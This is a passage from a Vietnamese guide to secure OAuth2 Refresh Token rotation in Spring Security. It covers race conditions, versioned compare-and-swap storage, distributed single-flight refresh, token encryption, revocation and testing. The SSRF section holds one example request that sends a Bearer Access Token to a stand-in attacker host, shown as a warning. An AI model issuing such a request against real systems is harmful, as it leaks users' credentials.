Đây là minh họa; tùy OP, `refresh_token` có thể **không** xuất hiện trong response. Một client triển khai đúng phải giữ token refresh cũ khi OP không phát token mới theo contract, và **thay token cũ bằng token mới** khi OP có rotate.

### 15.4. Sau refresh thành công

~~~text
Before: Access A1, Refresh R1
After:  Access A2, Refresh R2
~~~

Không in raw tokens thật; các ký hiệu A1/R1/A2/R2 chỉ là nhãn biểu diễn cho test. Kiểm tra store metadata/version hoặc so sánh controlled fake token identifiers trong môi trường test.

### 15.5. Nếu không thấy refresh

Kiểm tra:

1. Authorized client có Refresh Token không?
2. Access Token đã thực sự cần refresh theo `Clock` và allowed clock skew chưa?
3. Manager có `refreshToken()` provider?
4. Đúng `registrationId` và principal?
5. Client registration có Token Endpoint và auth method hợp lệ?
6. OP có revoke/expire Refresh Token không?
7. Thành công rồi nhưng success handler không save?
8. Test chưa subscribe/call manager nên refresh logic chưa chạy?

## 16. Refresh Token rotation là gì?

Theo mô hình Refresh Token rotation, sau khi nhận R1 hợp lệ:

~~~text
Refresh Request #1:
  Client -> OP: R1
  OP -> Client: Access A2, Refresh R2
  R1 becomes invalid (depending on provider policy)

Refresh Request #2:
  Client -> OP: R2
  OP -> Client: Access A3, Refresh R3
  R2 becomes invalid
~~~

Nếu R1 xuất hiện lần nữa, OP có thể trả `invalid_grant` và thậm chí vô hiệu hóa **cả token family** để phòng replay. Chi tiết là provider-specific; không tự khẳng định mọi OP sẽ revoke family.

### 16.1. Rotation bảo vệ điều gì?

Rotation giúp phát hiện sử dụng lại Refresh Token đã tiêu thụ; nó không thay thế TLS, client authentication, sender-constrained tokens, token encryption, storage access controls hoặc user consent.

### 16.2. Refresh Token Family

~~~text
Family F
  R1 -> R2 -> R3 -> R4

Current active = R4
Reusing R1/R2 could trigger reuse detection.
~~~

Một hệ thống không đồng bộ khiến Pod B gửi R1 sau khi Pod A đã lấy R2 có thể bị OP xem là replay, dù không có attacker. Do đó concurrency là vấn đề **vừa reliability vừa security**.

### 16.3. Khi OP trả 200 nhưng không trả R2

Không tự đặt `refresh_token=null` khiến lần sau user phải login lại nếu OP contract cho phép tiếp tục dùng R1. OAuth2 client library cần giữ token cũ khi không có token mới. Test rõ trường hợp này, không gán mọi successful response thành rotation.

## 17. Race condition: hai requests refresh đồng thời

~~~mermaid
sequenceDiagram
    autonumber
    participant A as Pod A / Request A
    participant B as Pod B / Request B
    participant DB as Token Store
    participant OP as Authorization Server
    A->>DB: load (company, alice): A1, R1
    B->>DB: load (company, alice): A1, R1
    A->>OP: refresh R1
    OP-->>A: A2, R2
    A->>DB: save A2, R2
    B->>OP: refresh R1
    OP-->>B: invalid_grant / replay detection
    B->>DB: default failure cleanup (unconditional)
    Note over DB: R2 may be deleted by stale failure
~~~

Có ba nguy cơ:

1. **Duplicate refresh:** OP từ chối R1 khi request thứ hai tới.
2. **Lost update:** response/record cũ ghi đè record mới.
3. **Stale failure cleanup:** request B xóa kết quả hợp lệ vừa được request A lưu.

### 17.1. Tại sao `synchronized` không đủ?

~~~java
public synchronized OAuth2AuthorizedClient refresh(...) {
    // ...
}
~~~

`synchronized` chỉ đồng bộ các threads cùng **một JVM instance**. Khi Pod A và Pod B là hai processes, mỗi pod có monitor riêng. Không thể dùng nó để bảo đảm duy nhất một refresh trên cluster.

### 17.2. Tại sao primary key không đủ?

Primary key bảo đảm không có hai database rows cùng `(registrationId, principalName)`. Nó **không chặn hai HTTP calls** gửi cùng R1 tới Token Endpoint.

### 17.3. Tại sao chỉ CAS cũng chưa đủ?

Compare-and-swap ngăn stale database write/delete. Nhưng nếu hai pods đã cùng gọi OP bằng R1, OP có thể coi request thứ hai là token replay và revoke family, dù CAS từ chối update của B.

**Giải pháp cần hai tầng:**

1. **Coordinated single-flight** trước khi gọi Token Endpoint, giảm nguy cơ dùng lại Refresh Token.
2. **Versioned CAS/conditional cleanup** khi lưu/xóa, bảo vệ trước lease expiry, races và stale callbacks.

## 18. Thiết kế một store có `version`

Để thử nghiệm nâng cao, tạo **một custom store khác**; không thay table của `JdbcOAuth2AuthorizedClientService` mà kỳ vọng class mặc định tự hiểu các cột `version`, encrypted payload và lease.

Ví dụ bảng ứng dụng:

~~~sql
CREATE TABLE oauth2_connection_secure (
    registration_id VARCHAR(100) NOT NULL,
    principal_key VARCHAR(200) NOT NULL,
    access_token_ciphertext BYTEA NOT NULL,
    refresh_token_ciphertext BYTEA,
    access_expires_at TIMESTAMPTZ NOT NULL,
    refresh_issued_at TIMESTAMPTZ,
    encrypted_data_key BYTEA NOT NULL,
    kms_key_version VARCHAR(100) NOT NULL,
    connection_status VARCHAR(30) NOT NULL,
    version BIGINT NOT NULL DEFAULT 1,
    updated_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (registration_id, principal_key)
);
~~~

Đây là **schema tự thiết kế**, không drop-in cho `JdbcOAuth2AuthorizedClientService`. Custom implementation phải encode/decode toàn bộ `OAuth2AuthorizedClient` đúng version, giữ token type/scopes/issuedAt/client registration và tránh serialization nguy hiểm.

### 18.1. Vì sao cần `version`?

Snapshot:

~~~text
Key: (company, alice)
DB version=7
Access=A1
Refresh=R1
~~~

Request A refresh R1 thành công và thực hiện CAS version 7 → 8. Request B còn snapshot version 7 không được phép overwrite/xóa version 8.

### 18.2. SQL update compare-and-swap

~~~sql
UPDATE oauth2_connection_secure
SET access_token_ciphertext = :encrypted_access_a2,
    refresh_token_ciphertext = :encrypted_refresh_r2,
    access_expires_at = :access_expires_at,
    refresh_issued_at = :refresh_issued_at,
    encrypted_data_key = :encrypted_data_key,
    kms_key_version = :kms_key_version,
    connection_status = 'ACTIVE',
    version = version + 1,
    updated_at = CURRENT_TIMESTAMP
WHERE registration_id = :registration_id
  AND principal_key = :principal_key
  AND version = :expected_version;
~~~

Interpretation:

~~~text
Updated rows = 1 -> Success; snapshot owned current version.
Updated rows = 0 -> Another writer changed record;
                    RELOAD and reconcile, do not overwrite.
~~~

Nếu token response R2 đã được cấp nhưng CAS thất bại, không vội retry bằng R1. Phải kiểm tra authoritative store/latest version và provider contract; kết quả remote có thể đã thay token family.

### 18.3. Conditional cleanup khi `invalid_grant`

~~~sql
UPDATE oauth2_connection_secure
SET connection_status = 'REAUTH_REQUIRED',
    version = version + 1,
    updated_at = CURRENT_TIMESTAMP
WHERE registration_id = :registration_id
  AND principal_key = :principal_key
  AND version = :failed_request_snapshot_version;
~~~

Nếu update 0 rows, một request khác đã thay record. Không xóa mù token mới. **Tuy nhiên**, nếu OP có policy revoke cả family khi replay, token mới cũng có thể bị ảnh hưởng; cần cảnh báo/reauth/validate trạng thái chứ không mặc định version mới chắc chắn còn valid.

### 18.4. Vì sao có `connection_status`?

Một workflow production có thể phân biệt:

~~~text
ACTIVE
REFRESH_IN_PROGRESS
TEMPORARILY_UNAVAILABLE
REAUTH_REQUIRED
REVOKE_PENDING
REVOKED
QUARANTINED
~~~

Đây là domain statuses do ứng dụng tự định nghĩa, **không phải trạng thái mặc định của Spring Security**. Không sử dụng status thay cho kiểm tra thời gian token/consent khi quyết định cấp quyền.

## 19. Distributed single-flight: chỉ một request refresh cho một connection

Mục tiêu:

~~~text
Key = (registrationId, canonical principal key)

N requests cùng cần refresh:
  -> 1 request thực sự gọi Token Endpoint
  -> N-1 requests đợi hoặc đọc lại Access Token mới
~~~

### 19.1. Thuật toán tham khảo

~~~text
authorizeOrRefresh(key):
  snapshot = store.load(key)
  if snapshot.accessTokenUsable():
      return snapshot

  lease = coordinator.tryAcquire(key, shortTimeout)
  if lease not acquired:
      waitWithBoundedBackoff()
      latest = store.load(key)
      if latest.accessTokenUsable():
          return latest
      retryAcquisitionOrReturnControlledError()

  try:
      current = store.load(key)  // RELOAD after obtaining lease
      if current.accessTokenUsable():
          return current

      if current.refreshTokenMissing():
          return REAUTH_REQUIRED

      response = tokenEndpoint.refresh(current.refreshToken)

      next = mergeTokens(current, response)
      committed = store.compareAndSwap(
          key, current.version, lease.fence, next)

      if committed:
          return next

      return reconcileWithLatestStoreAndProviderState()
  finally:
      lease.releaseIfStillOwner()
~~~

Đây là **pseudocode** để thiết kế một coordinator. Spring Security không tự cung cấp thuật toán distributed single-flight như trên khi bạn chỉ thêm `JdbcOAuth2AuthorizedClientService`.

### 19.2. Lease phải có fencing

Một distributed lock/lease có thể hết TTL khi request tới OP còn đang chạy:

~~~text
Pod A obtains lease fence=100
Pod A blocked in network
Lease expires
Pod B obtains lease fence=101
Pod A finally returns
~~~

Nếu database chỉ kiểm tra “đang giữ lock” bằng biến local, A có thể ghi token cũ đè token mới. **Fencing token** là số tăng đơn điệu, được store so sánh khi ghi, kết hợp optimistic version.

### 19.3. Không kéo transaction DB qua HTTP call tùy tiện

Giữ row lock trong một database transaction suốt quá trình gọi Token Endpoint có thể:

- Chiếm DB connection lâu.
- Tăng lock contention và deadlocks.
- Làm downtime OP gây cạn connection pool.
- Khó phân biệt timeout/unknown remote outcome.

Một distributed lease ngắn + versioned save có thể phù hợp hơn. Nếu quyết định dùng pessimistic lock, phải giới hạn timeout, kiểm soát pool, đánh giá failure semantics và test load thật.

### 19.4. Waiting clients không dùng Access Token đã hết hạn

Những requests không giữ lease phải đọc lại token mới sau khi request đầu hoàn tất. Nếu timeout, trả lỗi/degraded response phù hợp; không dùng expired token rồi retry vô hạn hoặc tự gọi refresh đồng loạt.

### 19.5. Key của lock phải đúng

~~~text
(provider/registration, principal/connection identity)
~~~

Không dùng một global lock cho mọi users: nó sẽ biến Token Endpoint thành bottleneck. Nhưng cũng không dùng raw email làm lock key khi multi-issuer/tenant vì hai connections khác nhau có thể bị trộn.

## 20. Tích hợp custom rotation coordinator với Spring Security

Một hướng production:

~~~text
Application
  -> RotationSafeAuthorizedClientService
      implements OAuth2AuthorizedClientService
      uses encrypted versioned DB store
      exposes per-connection coordinator operations

  -> Custom OAuth2AuthorizedClientManager / authorization provider adapter
      ensures coordinated refresh before remote call
      persists via conditional CAS
      handles invalid_grant with versioned cleanup

  -> OAuth2AuthorizedClientRepository
      delegates correct auth/principal lifecycle
~~~

**Không thể giải quyết hoàn toàn concurrent refresh** chỉ bằng override `saveAuthorizedClient()` của service mặc định nếu Token Endpoint đã bị gọi trùng ở tầng manager. Single-flight cần được đặt **trước remote refresh call**.

### 20.1. Khi nào custom service đủ?

Nếu chỉ cần durability của OAuth2AuthorizedClient, Spring Security JDBC service đáp ứng tốt khi được wired đúng. Nếu threat model/provider chính thức rotate Refresh Tokens một lần và triển khai multi-instance, có thể cần custom authorization orchestration hoặc một thư viện đã chứng minh concurrency semantics. Không tự coi một cache `Mono.cache()` dùng chung cho mọi users là single-flight an toàn.

### 20.2. Success handler và failure handler

Với manager/framework, cần rà soát:

- Success handler có persist token mới vào **đúng registration/principal**?
- Refresh Token mới có ghi atomically với Access Token mới?
- Failure handler có xóa token vì `invalid_grant` đúng snapshot hay delete unconditional?
- HTTP 401 của Resource Server có dùng failure handler khác với OAuth2 Token Endpoint failure không?
- Khi OP 503, có xóa token một cách không đúng không?
- `Reactive` errors có được compose, không `subscribe()` tách biệt?

Thay default failure handler mà không hiểu default save/remove behavior có thể tạo stale records; hãy kiểm thử đầy đủ.

## 21. Không xử lý mọi lỗi refresh giống nhau

| Lỗi | Nguyên nhân có thể | Hành động hợp lý |
| --- | --- | --- |
| `invalid_grant` | Refresh Token revoked/expired/reused, client mismatch | Xác minh snapshot/version, reauth/incident theo policy |
| `invalid_client` | Secret/key/method/client ID sai | Sửa client auth; không retry vô hạn |
| `invalid_scope` | Scope không được cấp | Sửa consent/request; không tự nâng quyền |
| HTTP 429 | Rate limit OP | Bounded retry, `Retry-After`, jitter |
| HTTP 502/503/504 | OP/network unavailable | Degrade, circuit breaker, giữ state hợp lệ |
| TCP timeout | Kết quả từ xa **không chắc** | Reconcile/retry theo protocol safety |
| Malformed token response | OP/client contract mismatch | Reject, không lưu token chưa xác minh |
| Resource Server 401 `invalid_token` | Access Token/API audience/expiry sai | Classify API error, cleanup đúng scope |
| Resource Server 403 `insufficient_scope` | Quyền API thiếu | Consent/authorization; không dùng admin token |

### 21.1. `invalid_grant` tại refresh khác tại code exchange

`invalid_grant` trong Authorization Code exchange có thể do code đã dùng, sai redirect/PKCE, code hết hạn. `invalid_grant` trong Refresh Token exchange có thể do refresh token rotation/revoke/expiry.

Khi log error, cần phân loại **grant type và stage** thay vì chỉ dựa vào tên mã.

### 21.2. Không tự kết luận token theft từ một lỗi

Rotation race có thể trông giống replay. Nhưng cũng không bỏ qua khả năng attacker đã sử dụng Refresh Token. Nếu provider báo token-family reuse hoặc có anomaly, làm theo playbook incident/quarantine/reauth.

### 21.3. 503 không phải revocation

Token Endpoint 503 không chứng minh grant bị thu hồi. Không gọi `removeAuthorizedClient()` cho mọi users sau một provider outage; giữ kết nối hợp lệ, retry hạn chế và theo dõi incident.

## 22. HTTP timeout và outcome unknown

Đây là nhánh khó:

~~~mermaid
sequenceDiagram
    participant RP as RP Client
    participant OP as Authorization Server
    RP->>OP: Refresh R1
    Note over RP: Local timeout before response
    OP-->>RP: A2 + R2 (may be lost)
    RP->>RP: Store still contains R1
    RP->>OP: Retry R1
    OP-->>RP: invalid_grant / token-family reuse
~~~

### 22.1. Tại sao retry thông thường nguy hiểm?

Một timeout ở client chỉ cho biết **client chưa thấy response**, không chứng minh OP chưa xử lý request. Nếu OP đã rotate R1→R2, retry R1 có thể trở thành replay.

### 22.2. Phục hồi

Tùy provider contract:

1. Kiểm tra logs/event IDs/connection state an toàn, không ghi raw token.
2. Reload record: một request khác có lưu R2 chưa?
3. Nếu chưa có token mới và outcome unknown, tránh retry vô hạn R1.
4. Có thể yêu cầu user reauthenticate hoặc dùng provider-supported recovery/introspection nếu có.
5. Với job quan trọng, đánh dấu `REAUTH_REQUIRED`/`QUARANTINED` theo policy, thông báo đúng user.

Không có một thuật toán universal có thể “lấy lại R2” nếu response đã mất và OP không hỗ trợ recovery.

## 23. Safe cleanup, revocation và consent

### 23.1. Local removal

~~~java
authorizedClientService.removeAuthorizedClient(
    "company", "alice-test-sub");
~~~

Chỉ xóa token trong RP store. OP có thể vẫn coi Refresh Token là hợp lệ; Access Token có thể còn hạn ở API.

### 23.2. Remote revocation (RFC 7009)

Khi user bấm disconnect hoặc hệ thống xử lý compromised grant, có thể gọi OP revocation endpoint nếu được hỗ trợ:

~~~http
POST /revoke HTTP/1.1
Host: id.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic REDACTED_CLIENT_AUTH

token=REDACTED_REFRESH_TOKEN&
token_type_hint=refresh_token
~~~

Theo RFC 7009, HTTP 200 có thể trả cho token đã được revoke **hoặc vốn đã invalid**. HTTP 503 **không xác nhận** đã revoke; cần queue/retry policy an toàn, không đánh dấu remote revocation đã thành công khi chưa có chứng cứ.

### 23.3. Khi nào xóa local?

Tùy threat model, có thể đánh dấu local connection `REVOKE_PENDING`/không cho dùng nữa **trước** khi remote revoke hoàn tất, nhưng vẫn cần lưu phần dữ liệu mã hóa đủ để retry revoke ở restricted channel. Không giữ raw token trong logs/queues không được mã hóa.

### 23.4. User logout khác revoke

RP local logout invalidates session nhưng không tự revoke mọi issued tokens. Khi có yêu cầu “logout all devices”, cần thiết kế OP session, token revocation/introspection/denylist và Resource Server strategy riêng.

## 24. Bảo mật token store: application-layer encryption

Một database chứa Refresh Tokens là một **credential vault**. Disk encryption và DB TLS chưa bảo vệ khỏi kịch bản SQL dump/DB operator có quyền đọc raw token columns.

### 24.1. Envelope encryption

~~~text
Application obtains KMS-managed data key
  |
  +-- Encrypt Access Token with AEAD (e.g. AES-GCM)
  +-- Encrypt Refresh Token with AEAD
  +-- Store ciphertext + nonce + encrypted data key + key version
  |
  +-- Never store plaintext token or raw key in logs
~~~

Data encryption key được quản lý theo chính sách KMS; dùng **unique random nonce** với AES-GCM, authenticated associated data (AAD) có thể bind ciphertext với `(registrationId, principalKey, tokenType, version)` để chống hoán đổi rows/columns. Phải có kế hoạch KMS key rotation, backup/restore, re-encryption và khả năng giải mã records còn sống.

### 24.2. Cẩn thận với key rotation và CAS version

Nếu AAD bind `version` của record, khi update version phải mã hóa lại ciphertext bằng **new version AAD** trong cùng transaction. Không chỉ tăng version ở SQL mà giữ ciphertext/AAD cũ.

### 24.3. Không trả token trong API diagnostics

Một endpoint diagnostics nếu thực sự cần chỉ nên có:

~~~json
{
  "registrationAlias": "company",
  "connectionStatus": "ACTIVE",
  "accessExpiryBucket": "less_than_5_minutes",
  "refreshTokenPresent": true,
  "storeVersion": 8
}
~~~

Đây là format gợi ý; bản thân principal alias/connection status cũng cần authorization, audit và privacy controls. Không trả token value, token hash ổn định có thể link identity, raw `sub`, `sid` hoặc `jti` ra client thông thường.

### 24.4. Backup và restore

- Backups phải được mã hóa và truy cập theo least privilege.
- KMS key versions cần còn khả dụng để đọc backups trong retention.
- Restore vào staging **không** được tự động dùng Refresh Tokens production tới OP thật.
- Khi cần DR test, dùng synthetic token records hoặc scrubbed fixtures.
- Delete/retention theo privacy và revocation policy, không để expired tokens vĩnh viễn.

## 25. Provider và tenant isolation

Một authorized client key có `registrationId` và `principalName`, nhưng identity architecture phải tránh các tình huống:

~~~text
OP A: iss=A, sub=123, email=user@example.test
OP B: iss=B, sub=123, email=user@example.test
~~~

Đây có thể là hai identities khác nhau. Nếu ứng dụng tự dùng email làm principal key cho mọi providers, token của một account có thể bị load nhầm ở service custom.

### 25.1. Không đổi issuer dưới cùng registration một cách mù quáng

Trong migration:

~~~text
registration "company" trước: issuer A
registration "company" sau:   issuer B
~~~

Records cũ `(company, principal)` có thể còn trong store nhưng không hợp lệ với issuer/client B. An toàn hơn có thể là dual registrations `company-old` và `company-new` cùng explicit identity migration. Không copy Refresh Token bytes giữa clients/issuers.

### 25.2. Tenant permission không đến từ Access Token một mình

User đã authenticated ở OP nhưng có thể chỉ là member tenant Alpha. Kể cả Access Token hợp lệ, API vẫn phải enforce issuer/audience/scope, app role, tenant membership và object-level ownership.

### 25.3. Negative tests

| Case | Expected |
| --- | --- |
| Alice token load với Bob principal | Không tìm thấy |
| Same principal alias khác registration | Tách records |
| OP A Refresh Token gửi OP B Token Endpoint | Không được gửi |
| Một provider trả `invalid_grant` | Không xóa provider khác |
| Một user logout | Không xóa token của user khác |
| Tenant switched | Không tự reuse token ngoài intended audience/consent |
| New issuer same raw `sub` | Không auto-link accounts |

## 26. Test provider refresh rotation có kiểm soát

### 26.1. Fake OP state machine

Một fake OP có thể mô phỏng:

~~~text
initial:
  currentRefresh = R1
  requestCount = 0

refresh(received):
  requestCount++

  if received != currentRefresh:
      return OAuth2 error invalid_grant

  if rotate:
      currentRefresh = nextGeneratedRefresh()
      return Access next + Refresh currentRefresh

  else:
      return Access next (no new Refresh Token)
~~~

Trong integration tests, implement bằng WireMock/MockWebServer hoặc dedicated test Authorization Server. **Test assertions cần dựa vào số lần gọi và state của fake OP**, không cần ghi raw tokens production.

### 26.2. Các assertions cốt lõi

1. Access A1 còn hạn → không gọi Token Endpoint.
2. Access A1 hết hạn + R1 hợp lệ → một refresh request thành công.
3. Response có R2 → database lưu A2/R2.
4. Response không có R2 → database vẫn lưu R1 khi OP cho phép.
5. R1 đã rotate và được reuse → `invalid_grant`, không retry vô hạn.
6. Lỗi 503 → store không bị xóa do transient error.
7. Response thiếu trường bắt buộc → không persist malformed tokens.
8. Different principal/registration → token stores không giao thoa.

### 26.3. Test refresh rotation cần duration/clock kiểm soát

Không dùng `Thread.sleep(60000)` trong unit tests. Có thể inject `Clock` cho custom rotation provider/coordinator hoặc tạo Access Token đã hết hạn trong fixture. Spring Security refresh provider có clock skew logic; test phải phù hợp semantics cụ thể.

## 27. Test concurrency với barrier và hai service instances

Không thể chứng minh race chỉ bằng hai calls tuần tự. Cần buộc hai requests cùng thấy token R1 và chạy song song:

~~~java
// Pseudocode test orchestration, không phải một test hoàn chỉnh.
CountDownLatch ready = new CountDownLatch(2);
CountDownLatch go = new CountDownLatch(1);

Callable<Result> task = () -> {
    ready.countDown();
    go.await();
    return coordinator.authorizeOrRefresh("company", "alice");
};

Future<Result> a = executor.submit(task);
Future<Result> b = executor.submit(task);

ready.await();
go.countDown();

Result ra = a.get();
Result rb = b.get();
~~~

**Không dùng cùng một synchronized Java object** để “giả lập” hai pods. Hai service/coordinator instances phải dùng chung database/lease backend, không dùng chung JVM-local lock nếu mục tiêu là kiểm thử distributed behavior.

### 27.1. Khi có single-flight chuẩn

Expected:

~~~text
Token Endpoint receives R1 exactly once.
Both callers use latest Access A2.
Store holds Refresh R2.
Store version increased exactly once for refresh.
No invalid_grant caused by local concurrency.
~~~

### 27.2. Khi cố tình không có single-flight

Fake OP có thể nhận R1 hai lần; một request `invalid_grant` hoặc provider reuse detection. Test nên tái hiện lỗi baseline để chứng minh lý do cần coordinator, **không** coi hiện tượng này là implementation được phép chạy production.

### 27.3. Test stale failure handler

Thứ tự kiểm thử:

~~~text
T1: Request B reads R1, version 7
T2: Request A refreshes R1 -> R2, commits version 8
T3: Request B receives invalid_grant
T4: B tries cleanup based on version 7

Expected:
  cleanup affects 0 rows
  version 8 remains
  incident/reauth policy may still inspect token-family state
~~~

**Chú ý:** R2 còn trong DB không chắc OP còn chấp nhận R2 nếu OP revoke family khi phát hiện replay. Test cả trường hợp provider báo family invalidation; không chỉ assert DB row tồn tại.

## 28. Kiểm thử database failure sau khi OP đã rotate

Một failure khó xử lý:

~~~text
1. OP accepts R1 and issues R2.
2. Database update of R2 fails.
3. Database still stores R1.
4. Reusing R1 may trigger invalid_grant.
~~~

### 28.1. Nguyên tắc

- Không giả định có thể rollback **remote Token Endpoint rotation** khi DB transaction rollback.
- Bắt lỗi và ghi safe incident state, tránh retry R1 vô hạn.
- Nếu có retry DB commit với **cùng successful response R2** trong một control flow an toàn, cần idempotency/version ownership; không tạo thêm OP refresh.
- Nếu R2 đã mất khỏi memory và không được persist, có thể phải reauthorize.
- Dùng durable, encrypted staging/recovery design chỉ khi threat model cho phép; không lưu R2 ở log hoặc unencrypted message queue.

### 28.2. Kết quả test

Test inject DB failure ngay sau token success, quan sát:

~~~text
Token Endpoint requestCount = 1
No blind second refresh with R1
Connection marked degraded/reauth as appropriate
No plaintext R2 printed
Application exposes controlled retry/recovery UX
~~~

### 28.3. Transaction boundaries

DB transaction không thể bao trùm atomicity với một remote OP HTTP call theo cơ chế thông thường. Đây là **distributed state transition**; cần rõ outcome unknown và recovery, không chỉ thêm `@Transactional` rồi coi toàn bộ quy trình atomic.

## 29. Test response classes của Resource Server

Sau khi refresh thành công, RP gọi API:

~~~http
GET /reports HTTP/1.1
Host: reports.example.test
Authorization: Bearer REDACTED_ACCESS_TOKEN
~~~

API có thể trả:

~~~http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token"
~~~

hoặc:

~~~http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope", scope="reports.read"
~~~

### 29.1. Không đồng nhất 401 và `invalid_grant`

- `invalid_grant` là lỗi từ **Authorization Server Token Endpoint**, thường liên quan code/Refresh Token/grant.
- `invalid_token` là lỗi Bearer ở **Resource Server**, liên quan Access Token.
- `insufficient_scope` là authorization failure, không có nghĩa Refresh Token đã bị revoke.
- API 503 thường là API outage, không phải lý do refresh vô hạn.

### 29.2. Failure handlers tại API call

Với Spring Security Servlet/Reactive `WebClient`, một `OAuth2AuthorizationFailureHandler` có thể xử lý Bearer errors và remove stale authorized clients theo policy. Cần test cleanup đúng `(registrationId, principalName)` và version, đặc biệt khi token mới vừa được refresh ở request khác.

### 29.3. Audience và scope

Một Access Token hợp lệ ở OP vẫn có thể không dành cho Reports API. Resource Server cần validate trusted issuer, audience, expiry, scopes/authorities và tenant permissions. Không dùng ID Token làm API Bearer Token.

## 30. WebClient và RestClient không được làm lộ credential

Khi ứng dụng gọi downstream, chỉ gửi OAuth2 token tới một **đích được cấu hình tin cậy**. Ví dụ WebClient/RestClient filter có thể gắn authorized client theo `clientRegistrationId`; phải có allowlist base URL và đúng resource audience.

### 30.1. Nguy cơ SSRF

Phản ví dụ:

~~~text
GET /proxy?url=https://attacker.example/collect
  -> Backend uses default OAuth2 authorized client
  -> Bearer Access Token leaks to attacker host
~~~

Không chấp nhận user-supplied URL để gắn token. Nếu có redirect HTTP, cần đánh giá HTTP client có chuyển `Authorization` header sang host khác không và chặn outbound targets không được phép.

### 30.2. Không log request/response wiretap đầy đủ

HTTP wiretap/debug headers có thể ghi Authorization, Token Endpoint form body, Access/Refresh Token response. Đối với test, dùng redacted event metadata và fake tokens, không giữ traces chứa secret.

## 31. Reactive/WebFlux phiên bản tương ứng

Trong WebFlux, các interface có prefix Reactive:

| Servlet | Reactive |
| --- | --- |
| `OAuth2AuthorizedClientService` | `ReactiveOAuth2AuthorizedClientService` |
| `OAuth2AuthorizedClientRepository` | `ServerOAuth2AuthorizedClientRepository` |
| `DefaultOAuth2AuthorizedClientManager` | `DefaultReactiveOAuth2AuthorizedClientManager` |
| `AuthorizedClientServiceOAuth2AuthorizedClientManager` | `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` |
| `SecurityFilterChain` | `SecurityWebFilterChain` |
| `HttpSession` | `WebSession` |

### 31.1. Persist authorized client trong Reactive

Reactive store/service phải trả `Mono` cho save/load/remove. `InMemoryReactiveOAuth2AuthorizedClientService` có thể phù hợp demo nhưng không bền vững sau restart. Với multi-node, sử dụng durable reactive repository/custom R2DBC store được thiết kế và kiểm thử riêng.

### 31.2. Không tự gọi `subscribe()` trong security handlers

~~~java
// SAI: cleanup chạy ngoài request/security lifecycle.
reactiveService.removeAuthorizedClient(id, principal)
    .subscribe();
return Mono.empty();

// ĐÚNG HƠN: compose publisher và để framework subscribe.
return reactiveService.removeAuthorizedClient(id, principal);
~~~

Đây là code fragment minh họa. Tự subscribe làm rời Reactor Context, error/cancellation/transaction, có thể trả HTTP success trước khi database update hoàn tất.

### 31.3. Không block event loop

Nếu custom store dùng blocking JDBC trong WebFlux:

~~~java
// Tạm thời cô lập blocking operation.
Mono<OAuth2AuthorizedClient> load(String id, String principal) {
    return Mono.fromCallable(() ->
            blockingService.loadAuthorizedClient(id, principal))
        .subscribeOn(Schedulers.boundedElastic());
}
~~~

Điều này không biến JDBC thành non-blocking; boundedElastic có giới hạn thread/queue. Ưu tiên reactive driver/architecture phù hợp và test BlockHound/latency. Concurrency và versioned CAS vẫn phải giải quyết như Servlet.

### 31.4. Reactive SecurityContext

`ReactiveSecurityContextHolder` dựa trên Reactor Context, không phải Servlet ThreadLocal. Background jobs không có `ServerWebExchange` cần principal/authorization đúng policy; không tự reuse token của browser user trong detached subscription.

## 32. Observability: thấy lỗi rotation mà không thấy token

Structured event mẫu:

~~~json
{
  "event": "oauth2_refresh_failed",
  "providerAlias": "company",
  "registrationId": "company",
  "stage": "refresh_token",
  "errorCategory": "invalid_grant",
  "snapshotVersion": 7,
  "latestVersion": 8,
  "concurrencyDetected": true,
  "correlationId": "oauth2-attempt-92",
  "secretFieldsRedacted": true
}
~~~

Đây là **format đề xuất**, không phải log tự động từ Spring Security. Tránh log raw `sub`, email, Access/Refresh Tokens, authorization code, `state`, `nonce`, client secret và SQL ciphertext nếu có nguy cơ liên kết identity.

### 32.1. Metrics gợi ý

| Metric | Tags an toàn |
| --- | --- |
| `oauth2_authorized_client_save_total` | registration, result |
| `oauth2_authorized_client_load_total` | registration, hit/miss |
| `oauth2_refresh_attempt_total` | provider, grant, result |
| `oauth2_refresh_invalid_grant_total` | provider, safe reason class |
| `oauth2_refresh_rotation_total` | provider |
| `oauth2_refresh_lock_wait_duration` | provider, coarse region |
| `oauth2_refresh_cas_conflict_total` | provider |
| `oauth2_refresh_unknown_outcome_total` | provider |
| `oauth2_token_store_error_total` | store, class |
| `oauth2_authorized_client_reauth_required_total` | provider |
| `oauth2_token_revocation_pending_total` | provider |

Không đặt raw user ID, principal, token hash, JWT `jti` hoặc session ID vào metric labels vì PII và high cardinality.

### 32.2. Alerts

Nên có cảnh báo khi:

- `invalid_grant` tăng ngay sau deployment hoặc secret rotation.
- Refresh Token reuse/rotation failures tăng theo provider.
- CAS conflicts tăng hoặc lock wait quá lâu.
- Token Endpoint 429/503, circuit breaker mở.
- Database token store unavailable.
- Hàng loạt users chuyển `REAUTH_REQUIRED`.
- Logging pipeline phát hiện token/credential leak.

Không tự kết luận mọi `invalid_grant` là compromise; phân loại incident theo evidence.

## 33. Runbook A — Restart làm mất authorized client

**Triệu chứng:** sau restart, login có thể còn/không còn nhưng service báo chưa có token.

**Kiểm tra:**

1. Dịch vụ đang dùng JDBC service hay in-memory?
2. Bean repository có delegate đúng service không?
3. Application kết nối đúng DB/schema/version?
4. Record key `(registrationId, principalName)` có đổi?
5. Token có bị custom cleanup/logout xóa?
6. Có test chỉ dùng local session nên hiểu nhầm persistent store?

**Khắc phục:** sửa wiring/schema/key mapping, xác minh save/load qua service instance mới; không tự đưa token thật vào logs để debug.

## 34. Runbook B — Refresh thành công nhưng lần sau vẫn dùng R1

**Triệu chứng:** OP trả R2 nhưng request tiếp theo dùng R1 rồi `invalid_grant`.

**Kiểm tra:**

- Response có R2 thật không?
- Success handler có persist R2 không?
- Store có transaction rollback không?
- Một pod khác ghi đè record cũ?
- Manager load từ in-memory/session store khác JDBC?
- Principal/registration key khi save/load có khác?
- Encryption/serialization có giữ refresh token mới?

**Khắc phục:** update atomic; versioned CAS; kiểm tra tất cả instances dùng same store; không retry R1 vô hạn.

## 35. Runbook C — `invalid_grant` tăng sau scale-out

**Triệu chứng:** mỗi user thỉnh thoảng bị yêu cầu login lại dù Access Token mới vừa được cấp.

**Kiểm tra:** hai pods cùng refresh R1, default failure cleanup delete R2, OP replay policy, lack of distributed coordination.

